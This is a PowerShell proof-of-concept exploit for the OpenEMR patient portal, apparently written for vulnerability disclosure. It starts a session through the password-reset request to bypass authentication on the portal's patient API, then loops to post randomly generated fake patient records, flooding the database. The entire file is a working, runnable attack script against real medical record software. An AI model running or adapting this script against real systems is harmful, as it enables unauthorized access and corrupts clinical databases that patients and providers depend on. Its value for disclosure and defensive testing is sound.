#################################################################################################################
#  Author: Chris Patterson                                                                                      #
#  Date: 2022-01-01                                                                                             #
#  Purpose: Identify vulnerability in OpenEMR patient portal where self registration allows automated           #
#           scripting of patient creation.  Allowing an attacker to flood the database with patients.           #
#                                                                                                               #
#  CVE ID:                                                                                                      #
#                                                                                                               #
#################################################################################################################

$StartTime = Get-Date
$maxRuns = Read-Host "Number of runs to complete"
$counter = 0
$requestCount = 0

#Set proxy if needed (Fiddler users http://localhost:8888)
$proxy = $null #"http://localhost:8888"

#Get the server fqdn
if (!$fqdn) {
    $fqdn = Read-Host -Prompt "Enter the fqdn of the OpenEMR Instance (https://demo.openemr.io/openemr)"
}

#Start a session by requesting a password reset without logging in
#This activates the error handling logic in index.php which sets $_SESSION['register']=true
#when register session variable is true, authentication is bypassed for the patient portal API
$null = Invoke-WebRequest -URI "$fqdn/portal/index.php?requestNew=true" -SessionVariable 'session' -Proxy $proxy
$requestCount++
#Alternatively, if the self registration function is enabled, we can start that session to achieve
#the same result of a register session variable set to true.
#$null = Invoke-WebRequest -URI "$fqdn/portal/account/register.php" -SessionVariable 'session'
if (!$session) {
    Write-Host "A session could not be established.  Check the connection settings."
    exit
}

$response = Invoke-WebRequest -URI "$fqdn/portal/account/account.php?action=get_newpid" -WebSession $Session -Proxy $proxy
$requestCount++
$NextPatientID = [int]$response.Content
$successes = 0

while ($counter -lt $maxRuns) {
    $counter++
    
    $first = -join ((65..90)+(97..122)|Get-Random -Count ((5..15)|Get-Random) | ForEach-Object {[char]$_})
    $last = -join ((65..90)+(97..122)|Get-Random -Count ((5..15)|Get-Random) | ForEach-Object {[char]$_})
    $email = "$($first[0])$($last)@$(-join ((65..90)+(97..122)|Get-Random -Count ((5..15)|Get-Random) | ForEach-Object {[char]$_})).$(("com","net","co","biz")|Get-Random)"
    
    $body = @{
        "note"=$null
        "id"=$NextPatientID
        "title"=""
        "language"=""
        "financial"=$null  
        "fname"= $first
        "lname"= $last
        "mname"="" 
        "dob"= (Get-Date).AddDays(((-10000..-36500) | Get-Random)).ToString("yyyy-MM-dd")
        "street"="test" 
        "postalCode"="" 
        "city"="test" 
        "state"="" 
        "countryCode"="" 
        "driversLicense"=$null  
        "ss"="" 
        "occupation"=$null  
        "phoneHome"="" 
        "phoneBiz"="" 
        "phoneContact"="" 
        "phoneCell"="" 
        "pharmacyId"=0 
        "status"="" 
        "contactRelationship"="" 
        "date"="$((Get-Date).AddDays(((-10000..-36500) | Get-Random)).ToString("yyyy-MM-dd")) 00:00:00" 
        "sex"="Male" 
        "referrer"=$null  
        "referrerid"=$null  
        "providerid"="1" 
        "refProviderid"=0 
        "email"= $email 
        "emailDirect"= $email
        "ethnoracial"=$null  
        "race"="" 
        "ethnicity"="" 
        "religion"="" 
        "familySize"="" 
        "pubpid"=$NextPatientID
        "pid"=$NextPatientID
        "hipaaMail"="" 
        "hipaaVoice"="" 
        "hipaaNotice"="" 
        "hipaaMessage"="" 
        "hipaaAllowsms"="" 
        "hipaaAllowemail"="YES" 
        "regdate"= "$((Get-Date).AddDays(((-10000..-36500) | Get-Random)).ToString("yyyy-MM-dd")) 00:00:00" 
        "mothersname"="" 
        "guardiansname"="" 
        "allowImmRegUse"="" 
        "allowImmInfoShare"=""
        "allowHealthInfoEx"="" 
        "allowPatientPortal"="YES" 
        "careTeam"=0 
        "county"=""
    }

    $bodyJson = $body | ConvertTo-Json -Depth 1 -Compress

    try {
        $null = Invoke-WebRequest -URI "$fqdn/portal/patient/api/patient" -WebSession $Session -Body $bodyJson -Method Post -Proxy $proxy
        $requestCount++
        $successes++
    } catch {
        $_.Exception
    } finally {
        $NextPatientID++
    }

    Write-Host -NoNewLine "`r$(($successes / ($maxRuns) * 100))%   -   $successes of $($maxRuns) iterations complete"
}

Write-Host -NoNewLine "`rRun Duration was $((Get-Date) - $StartTime) for $counter iterations, $successes were successful"
Write-Host ""